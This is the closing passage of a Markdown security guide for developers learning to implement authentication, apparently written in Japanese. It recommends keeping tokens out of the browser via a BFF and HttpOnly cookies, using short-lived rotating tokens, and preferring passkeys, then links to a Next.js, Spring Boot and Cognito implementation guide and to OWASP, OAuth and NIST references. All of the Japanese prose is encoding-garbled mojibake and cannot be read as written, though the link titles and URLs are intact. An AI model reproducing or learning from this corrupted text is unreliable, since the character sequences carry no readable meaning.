1. **ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ãƒ–ãƒ©ã‚¦ã‚¶ã«éœ²å‡ºã•ã›ãªã„**(BFF/HttpOnly Cookie)
2. **çŸ­å¯¿å‘½åŒ– + ãƒ­ãƒ¼ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³**(15åˆ†ã€œ1æ™‚é–“ + ä½¿ã„æ¨ã¦)
3. **ãƒ‘ã‚¹ã‚­ãƒ¼å„ªå…ˆ**(ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°è€æ€§ã€ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒ¬ã‚¹)

### æ¬¡ã®ã‚¹ãƒ†ãƒƒãƒ—

ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®åŸºç¤ã‚’ç†è§£ã—ãŸã‚‰ã€å®Ÿè£…ã‚¬ã‚¤ãƒ‰ã«é€²ã‚“ã§ãã ã•ã„:

**[å®Ÿè£…ã‚¬ã‚¤ãƒ‰](implementation-guide.md)** - Next.js + Spring Boot + Cognito ã®ã‚»ã‚­ãƒ¥ã‚¢ãªå®Ÿè£…æ–¹æ³•

---

**å‚è€ƒè³‡æ–™**:

- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [OAuth 2.0 Security Best Current Practice](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics)
- [NIST 800-63B](https://pages.nist.gov/800-63-3/sp800-63b.html)

**æœ€çµ‚æ›´æ–°**: 2025å¹´10æœˆ15æ—¥
**å¯¾è±¡èª­è€…**: èªè¨¼æ©Ÿèƒ½ã®å®Ÿè£…ã‚’å­¦ã¶é–‹ç™ºè€…(åˆç´šã€œä¸­ç´š)
